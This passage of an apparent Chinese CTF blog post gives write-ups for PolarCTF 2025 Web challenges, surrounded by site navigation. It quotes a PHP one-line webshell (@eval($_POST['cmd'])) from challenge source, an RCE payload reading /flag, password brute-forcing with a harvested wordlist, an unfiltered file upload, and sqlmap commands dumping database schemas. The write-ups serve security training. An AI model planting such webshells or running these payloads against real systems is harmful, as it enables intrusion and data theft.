class="string">&quot;content&quot;</span>&gt;</span><br><span class="line">        &lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;page&quot;</span> value=<span class="string">&quot;miji.php&quot;</span>&gt;</span><br><span class="line">            &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;秘籍&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">button</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">get</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">page</span>&quot; <span class="title">value</span>=&quot;<span class="title">fabao</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;法宝&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">get</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">page</span>&quot; <span class="title">value</span>=&quot;<span class="title">jinshouzhi</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;金手指&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">if</span> (<span class="title">isset</span>($<span class="title">_GET</span>[&#x27;<span class="title">page</span>&#x27;])) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div id=&quot;display&quot;&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先看到文件包含的检查，接下来是get传参</p>
+<p>等等！！！这是，一句话木马</p>
+<p>直接连接即可</p>
+<p>但是呢，eval也是代码执行的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>同理，也是RCE</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323215525170.png" alt="image-20250323215525170"></p>
+<h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><p>正常文件包含+rce</p>
+<h2 id="椰子树晕淡水鱼"><a href="#椰子树晕淡水鱼" class="headerlink" title="椰子树晕淡水鱼"></a>椰子树晕淡水鱼</h2><h3 id="题解-8"><a href="#题解-8" class="headerlink" title="题解"></a>题解</h3><p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250324215316924.png" alt="image-20250324215316924"></p>
+<p>提示是文件包含，但更改page没结果</p>
+<p>扫一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250324215012908.png" alt="image-20250324215012908"></p>
+<p>访问about，给了作者</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325155322679.png" alt="image-20250325155322679"></p>
+<p>访问password，自动下载一个zip，爆破密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250324215149671.png" alt="image-20250324215149671"></p>
+<p>是一个密码本，没有说账号</p>
+<p>先前的作者也许就是账号</p>
+<p>用获取的字典进行爆破密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325155219022.png" alt="image-20250325155219022"></p>
+<p>下边使用yakit尝试了一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325154656828.png" alt="image-20250325154656828"></p>
+<p>没过滤，直接上传成功，访问文件即可获得flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325155728523.png" alt="image-20250325155728523"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325155745099.png" alt="image-20250325155745099"></p>
+<h3 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h3><p>信息收集+爆破+文件上传</p>
+<h2 id="再给我30元"><a href="#再给我30元" class="headerlink" title="再给我30元"></a>再给我30元</h2><h3 id="题解-9"><a href="#题解-9" class="headerlink" title="题解"></a>题解</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45719090/article/details/129241110">SQLMap使用|命令大全（干货）_sqlmap命令大全-CSDN博客</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://1404edd4-11ae-4b25-b572-9526bd30a4d4.www.polarctf.com:8090/?id=1&quot; -p id --level=5 --risk=3 --random-agent</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325170526514.png" alt="image-20250325170526514"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325170926848.png" alt="image-20250325170926848"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325170943554.png" alt="image-20250325170943554"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://1404edd4-11ae-4b25-b572-9526bd30a4d4.www.polarctf.com:8090/?id=1&quot; -p id --level=5 --risk=3 --random-agent --union-cols=2 -technique=U --dbms=mysql \ --sql-query=&quot;union select 1,group_concat(schema_name) from information_schema.schemata&quot; -dump --dbms=mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250325172153029.png" alt="image-20250325172153029"></p>
+<h3 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45719090/article/details/129241110">SQLMap使用|命令大全（干货）_sqlmap命令大全-CSDN博客</a></p>
+<h2 id="小白说收集很重要"><a href="#小白说收集很重要" class="headerlink" title="小白说收集很重要"></a>小白说收集很重要</h2><h3 id="题解-10"><a href="#题解-10" class="headerlink" title="题解"></a>题解</h3><p>本题考查非常全面，必须安排上，信息收集，社工，非常切合渗透的一道基础题</p>
+<p>不仅提供了知识模块进行学习，还结合了实际环境方便练习！！！！</p>
+<p>综合，全面，有趣！！！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323123742579.png" alt="image-20250323123742579"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/image-20250323123909823.png"></p>
+<h3 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h3><p>这个专门写一篇wp吧</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+             <a href="/tags/WP/" <i class="fa fa-tag"></i> WP</a>
+             <a href="/tags/Web/" <i class="fa fa-tag"></i> Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/03/21/2025%20CISCN%20&%20CCB/" rel="prev" title="2025 CISCN & CCB ISW 磁盘取证">
+      <i class="fa fa-chevron-left"></i> 2025 CISCN & CCB ISW 磁盘取证
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PolarCTF-2025%E6%98%A5%E5%AD%A3%E8%B5%9B-Web"><span class="nav-number">1.</span> <span class="nav-text">PolarCTF 2025春季赛 &amp; Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%A5%E4%B8%AA%E5%BC%B9%E7%AA%97"><span class="nav-number">1.2.</span> <span class="nav-text">来个弹窗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.2.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.2.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coke%E7%9A%84%E7%99%BB%E9%99%86"><span class="nav-number">1.3.</span> <span class="nav-text">coke的登陆</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="nav-number">1.3.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-number">1.3.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bllbl-rce"><span class="nav-number">1.4.</span> <span class="nav-text">bllbl_rce</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="nav-number">1.4.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="nav-number">1.4.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#background"><span class="nav-number">1.5.</span> <span class="nav-text">background</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-3"><span class="nav-number">1.5.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="nav-number">1.5.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0e%E4%BA%8B%E4%BB%B6"><span class="nav-number">1.6.</span> <span class="nav-text">0e事件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-4"><span class="nav-number">1.6.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="nav-number">1.6.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E8%AF%BB%E6%9C%BARCE"><span class="nav-number">1.7.</span> <span class="nav-text">复读机RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-5"><span class="nav-number">1.7.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-5"><span class="nav-number">1.7.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xCsMsD"><span class="nav-number">1.8.</span> <span class="nav-text">xCsMsD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-6"><span class="nav-number">1.8.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-6"><span class="nav-number">1.8.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8B%97%E9%BB%91%E5%AD%90CTF%E5%8F%98%E5%BC%BA%E4%B9%8B%E8%B7%AF"><span class="nav-number">1.9.</span> <span class="nav-text">狗黑子CTF变强之路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-7"><span class="nav-number">1.9.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-7"><span class="nav-number">1.9.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A4%B0%E5%AD%90%E6%A0%91%E6%99%95%E6%B7%A1%E6%B0%B4%E9%B1%BC"><span class="nav-number">1.10.</span> <span class="nav-text">椰子树晕淡水鱼</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-8"><span class="nav-number">1.10.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-8"><span class="nav-number">1.10.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%8D%E7%BB%99%E6%88%9130%E5%85%83"><span class="nav-number">1.11.</span> <span class="nav-text">再给我30元</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-9"><span class="nav-number">1.11.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-9"><span class="nav-number">1.11.2.</span> <span class="nav-text">知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%99%BD%E8%AF%B4%E6%94%B6%E9%9B%86%E5%BE%88%E9%87%8D%E8%A6%81"><span class="nav-number">1.12.</span> <span class="nav-text">小白说收集很重要</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3-10"><span class="nav-number">1.12.1.</span> <span class="nav-text">题解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-10"><span class="nav-number">1.12.2.</span> <span class="nav-text">知识点</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="CTF-DUAN"
+      src="https://cdn.jsdelivr.net/gh/F0T0ne/Image/logo.jpg">
+  <p class="site-author-name" itemprop="name">CTF-DUAN</p>
+  <div class="site-description" itemprop="description">CTF学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CTF-DUAN</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>  -->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
